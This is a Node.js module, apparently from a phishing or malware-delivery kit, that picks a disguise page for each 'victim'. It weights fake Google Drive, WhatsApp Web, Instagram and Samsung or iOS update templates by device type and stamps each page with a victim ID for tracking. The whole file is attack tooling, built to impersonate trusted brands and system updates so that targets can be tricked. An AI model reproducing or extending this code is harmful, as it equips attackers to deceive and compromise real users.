const fs = require('fs-extra');
const path = require('path');

class Camouflage {
    
    static templates = [
        {
            name: 'Google Drive',
            path: 'google-drive',
            probability: 0.3,
            conditions: (victim) => true
        },
        {
            name: 'WhatsApp Web',
            path: 'whatsapp-web',
            probability: 0.25,
            conditions: (victim) => victim.isMobile
        },
        {
            name: 'Instagram',
            path: 'instagram',
            probability: 0.2,
            conditions: (victim) => true
        },
        {
            name: 'Samsung Update',
            path: 'system-update',
            probability: 0.15,
            conditions: (victim) => victim.isAndroid
        },
        {
            name: 'iOS Update',
            path: 'ios-update',
            probability: 0.1,
            conditions: (victim) => victim.isIOS
        }
    ];
    
    static async selectTemplate(victim) {
        // Filtrer les templates valides
        const validTemplates = this.templates.filter(t => 
            !t.conditions || t.conditions(victim)
        );
        
        // Choisir selon la probabilité
        const rand = Math.random();
        let cumulative = 0;
        
        for (const template of validTemplates) {
            cumulative += template.probability;
            if (rand < cumulative) {
                return template;
            }
        }
        
        return validTemplates[0];
    }
    
    static async loadTemplate(templateName, victim) {
        const templatePath = path.join(__dirname, '..', 'public', 'templates', templateName, 'index.html');
        let html = await fs.readFile(templatePath, 'utf8');
        
        // Personnaliser le template
        html = html.replace(/{{victim_id}}/g, victim.id);
        html = html.replace(/{{timestamp}}/g, Date.now());
        
        return html;
    }
}

module.exports = Camouflage;
